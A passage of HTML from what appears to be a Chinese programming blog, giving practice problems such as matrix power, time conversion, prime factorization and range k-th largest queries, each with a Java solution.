class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">double</span>[] area1 = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">double</span>[] area2 = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)&#123;</span><br><span class="line">            area1[i] = in.nextDouble();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)&#123;</span><br><span class="line">            area2[j] = in.nextDouble();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span>[] z = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="comment">// x1</span></span><br><span class="line">        z[<span class="number">0</span>] = Math.max(Math.min(area1[<span class="number">0</span>],area1[<span class="number">2</span>]),Math.min(area2[<span class="number">0</span>],area2[<span class="number">2</span>]));</span><br><span class="line">        <span class="comment">// y1</span></span><br><span class="line">        z[<span class="number">1</span>] = Math.max(Math.min(area1[<span class="number">1</span>],area1[<span class="number">3</span>]),Math.min(area2[<span class="number">1</span>],area2[<span class="number">3</span>]));</span><br><span class="line">        <span class="comment">// x2</span></span><br><span class="line">        z[<span class="number">2</span>] = Math.min(Math.max(area1[<span class="number">0</span>],area1[<span class="number">2</span>]),Math.max(area2[<span class="number">0</span>],area2[<span class="number">2</span>]));</span><br><span class="line">        <span class="comment">// y2</span></span><br><span class="line">        z[<span class="number">3</span>] = Math.min(Math.max(area1[<span class="number">1</span>],area1[<span class="number">3</span>]),Math.max(area2[<span class="number">1</span>],area2[<span class="number">3</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(z[<span class="number">3</span>]&gt;z[<span class="number">1</span>] &amp;&amp; z[<span class="number">2</span>]&gt;z[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="keyword">double</span> sum = (z[<span class="number">2</span>] - z[<span class="number">0</span>]) * (z[<span class="number">3</span>] - z[<span class="number">1</span>]);</span><br><span class="line">            System.out.println(String.format(<span class="string">"%.2f"</span>,sum));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"0.00"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-17-矩阵乘法"><a href="#BASIC-17-矩阵乘法" class="headerlink" title="BASIC-17 矩阵乘法"></a>BASIC-17 矩阵乘法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　给定一个N阶矩阵A，输出A的M次幂（M是非负整数）</span><br><span class="line">　　例如：</span><br><span class="line">　　A =</span><br><span class="line">　　1 2</span><br><span class="line">　　3 4</span><br><span class="line">　　A的2次幂</span><br><span class="line">　　7 10</span><br><span class="line">　　15 22</span><br><span class="line">输入格式</span><br><span class="line">　　第一行是一个正整数N、M（1&lt;=N&lt;=30, 0&lt;=M&lt;=5），表示矩阵A的阶数和要求的幂数</span><br><span class="line">　　接下来N行，每行N个绝对值不超过10的非负整数，描述矩阵A的值</span><br><span class="line">输出格式</span><br><span class="line">　　输出共N行，每行N个整数，表示A的M次幂所对应的矩阵。相邻的数之间用一个空格隔开</span><br><span class="line">样例输入</span><br><span class="line">2 2</span><br><span class="line">1 2</span><br><span class="line">3 4</span><br><span class="line">样例输出</span><br><span class="line">7 10</span><br><span class="line">15 22</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 1 2 3</span></span><br><span class="line"><span class="comment">     * 3 4 4</span></span><br><span class="line"><span class="comment">     * 5 6 7</span></span><br><span class="line"><span class="comment">     * a[0][0] * a[0][0] + a[0][1] * a[1][0] + a[0][2] * a[2][0]</span></span><br><span class="line"><span class="comment">     * a[0][0] * a[0][1] + a[0][1] * a[1][1] + a[0][2] * a[2][1]</span></span><br><span class="line"><span class="comment">     * a[0][0] * a[0][2] + a[0][1] * a[1][2] + a[0][2] * a[2][2]</span></span><br><span class="line"><span class="comment">     * a[1][0]*a[0][0] + a[1][1] * a[1][0]</span></span><br><span class="line"><span class="comment">     * a[1][0]*a[0][1] + a[1][1] * a[1][1]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> m = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[][] matrix = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">        <span class="keyword">int</span>[][] temp = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">        <span class="keyword">int</span>[][] b = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> a = <span class="number">0</span>;a &lt; n;a++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> c = <span class="number">0</span>;c &lt; n;c++)&#123;</span><br><span class="line">                matrix[a][c] = in.nextInt();</span><br><span class="line">                temp[a][c] = matrix[a][c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 考虑m=0的情况</span></span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i!=j)&#123;</span><br><span class="line">                        System.out.print(<span class="string">"0 "</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        System.out.print(<span class="string">"1 "</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>;k &lt; m-<span class="number">1</span>;k++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">                    <span class="comment">// 总共有几项相加</span></span><br><span class="line">                    <span class="keyword">int</span> c = n;</span><br><span class="line">                    <span class="keyword">while</span> (c&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                        b[i][j] += temp[i][c-<span class="number">1</span>] * matrix[c-<span class="number">1</span>][j];</span><br><span class="line">                        c--;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">                    <span class="comment">// 将前面计算出的矩阵合成</span></span><br><span class="line">                    temp[i][j] = b[i][j];</span><br><span class="line">                    b[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">                System.out.print(temp[i][j]+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-14-时间转换"><a href="#BASIC-14-时间转换" class="headerlink" title="BASIC-14 时间转换"></a>BASIC-14 时间转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　给定一个以秒为单位的时间t，要求用“&lt;H&gt;:&lt;M&gt;:&lt;S&gt;”的格式来表示这个时间。&lt;H&gt;表示时间，&lt;M&gt;表示分钟，而&lt;S&gt;表示秒，它们都是整数且没有前导的“0”。例如，若t=0，则应输出是“0:0:0”；若t=3661，则输出“1:1:1”。</span><br><span class="line">输入格式</span><br><span class="line">　　输入只有一行，是一个整数t（0&lt;=t&lt;=86399）。</span><br><span class="line">输出格式</span><br><span class="line">　　输出只有一行，是以“&lt;H&gt;:&lt;M&gt;:&lt;S&gt;”的格式所表示的时间，不包括引号。</span><br><span class="line">样例输入</span><br><span class="line">0</span><br><span class="line">样例输出</span><br><span class="line">0:0:0</span><br><span class="line">样例输入</span><br><span class="line">5436</span><br><span class="line">样例输出</span><br><span class="line">1:30:36</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> sum = in.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> hour = sum /<span class="number">3600</span>;</span><br><span class="line">        <span class="keyword">int</span> minute = (sum - hour * <span class="number">3600</span>) /<span class="number">60</span>;</span><br><span class="line">        <span class="keyword">int</span> second = sum - hour*<span class="number">3600</span> - minute*<span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(hour+<span class="string">":"</span>+minute+<span class="string">":"</span>+second);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-15-字符串对比"><a href="#BASIC-15-字符串对比" class="headerlink" title="BASIC-15 字符串对比"></a>BASIC-15 字符串对比</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　给定两个仅由大写字母或小写字母组成的字符串(长度介于1到10之间)，它们之间的关系是以下4中情况之一：</span><br><span class="line">　　1：两个字符串长度不等。比如 Beijing 和 Hebei</span><br><span class="line">　　2：两个字符串不仅长度相等，而且相应位置上的字符完全一致(区分大小写)，比如 Beijing 和 Beijing</span><br><span class="line">　　3：两个字符串长度相等，相应位置上的字符仅在不区分大小写的前提下才能达到完全一致（也就是说，它并不满足情况2）。比如 beijing 和 BEIjing</span><br><span class="line">　　4：两个字符串长度相等，但是即使是不区分大小写也不能使这两个字符串一致。比如 Beijing 和 Nanjing</span><br><span class="line">　　编程判断输入的两个字符串之间的关系属于这四类中的哪一类，给出所属的类的编号。</span><br><span class="line">输入格式</span><br><span class="line">　　包括两行，每行都是一个字符串</span><br><span class="line">输出格式</span><br><span class="line">　　仅有一个数字，表明这两个字符串的关系编号</span><br><span class="line">样例输入</span><br><span class="line">BEIjing</span><br><span class="line">beiJing</span><br><span class="line">样例输出</span><br><span class="line">3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String str = in.next();</span><br><span class="line">        String str2 = in.next();</span><br><span class="line">        <span class="keyword">char</span>[] strArr = str.toCharArray();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(str.length() != str2.length())&#123;</span><br><span class="line">            System.out.println(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.equals(str2))&#123;</span><br><span class="line">                <span class="comment">// 情况2</span></span><br><span class="line">                System.out.println(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(str.toLowerCase().equals(str2.toLowerCase()))&#123;</span><br><span class="line">                System.out.println(<span class="number">3</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-16-分解质因数"><a href="#BASIC-16-分解质因数" class="headerlink" title="BASIC-16 分解质因数"></a>BASIC-16 分解质因数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　求出区间[a,b]中所有整数的质因数分解。</span><br><span class="line">输入格式</span><br><span class="line">　　输入两个整数a，b。</span><br><span class="line">输出格式</span><br><span class="line">　　每行输出一个数的分解，形如k=a1*a2*a3...(a1&lt;=a2&lt;=a3...，k也是从小到大的)(具体可看样例)</span><br><span class="line">样例输入</span><br><span class="line">3 10</span><br><span class="line">样例输出</span><br><span class="line">3=3</span><br><span class="line">4=2*2</span><br><span class="line">5=5</span><br><span class="line">6=2*3</span><br><span class="line">7=7</span><br><span class="line">8=2*2*2</span><br><span class="line">9=3*3</span><br><span class="line">10=2*5</span><br><span class="line">提示</span><br><span class="line">　　先筛出所有素数，然后再分解。</span><br><span class="line">数据规模和约定</span><br><span class="line">　　2&lt;=a&lt;=b&lt;=10000</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fenjie</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i &lt;= num;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == num)&#123;</span><br><span class="line">                System.out.print(i);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num&gt;i &amp;&amp; (num%i==<span class="number">0</span>))&#123;</span><br><span class="line">                System.out.print(i+<span class="string">"*"</span>);</span><br><span class="line">                fenjie(num/i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> left = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> right = in.nextInt();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = left;i &lt;= right;i++)&#123;</span><br><span class="line">            System.out.print(i+<span class="string">"="</span>);</span><br><span class="line">            fenjie(i);</span><br><span class="line">            System.out.println(<span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="算法训练"><a href="#算法训练" class="headerlink" title="算法训练"></a>算法训练</h2><h3 id="ALGO-1-区间k大数查询"><a href="#ALGO-1-区间k大数查询" class="headerlink" title="ALGO-1 区间k大数查询"></a>ALGO-1 区间k大数查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">给定一个序列，每次询问序列中第l个数到第r个数中第K大的数是哪个。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">第一行包含一个数n，表示序列长度。</span><br><span class="line"></span><br><span class="line">第二行包含n个正整数，表示给定的序列。</span><br><span class="line"></span><br><span class="line">第三个包含一个正整数m，表示询问个数。</span><br><span class="line"></span><br><span class="line">接下来m行，每行三个数l,r,K，表示询问序列从左往右第l个数到第r个数中，从大往小第K大的数是哪个。序列元素从1开始标号。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">总共输出m行，每行一个数，表示询问的答案。</span><br><span class="line">样例输入</span><br><span class="line">5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">2</span><br><span class="line">1 5 2</span><br><span class="line">2 3 2</span><br><span class="line">样例输出</span><br><span class="line">4</span><br><span class="line">2</span><br><span class="line">数据规模与约定</span><br><span class="line">对于30%的数据，n,m&lt;=100；</span><br><span class="line"></span><br><span class="line">对于100%的数据，n,m&lt;=1000；</span><br><span class="line"></span><br><span class="line">保证k&lt;=(r-l+1)，序列中的数&lt;=106。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">int</span>[] arrOld = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            arr[i] = in.nextInt();</span><br><span class="line">            arrOld[i] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> m = in.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; m;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> first = in.nextInt();</span><br><span class="line">            <span class="keyword">int</span> last = in.nextInt();</span><br><span class="line">            <span class="keyword">int</span> index = in.nextInt();</span><br><span class="line">            <span class="keyword">int</span>[] newArr;</span><br><span class="line">            newArr = Arrays.copyOfRange(arr,first-<span class="number">1</span>,last);</span><br><span class="line">            arrSort(newArr);</span><br><span class="line">            result[i] = newArr[index-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; result.length;i++)&#123;</span><br><span class="line">            System.out.println(result[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 冒泡排序</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">arrSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>;j &lt; arr.length;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i]&lt;arr[j])&#123;</span><br><span class="line">                    <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">                    arr[i] = arr[j];</span><br><span class="line">                    arr[j] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-2-最大最小公倍数"><a href="#ALGO-2-最大最小公倍数" class="headerlink" title="ALGO-2  最大最小公倍数"></a>ALGO-2  最大最小公倍数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span 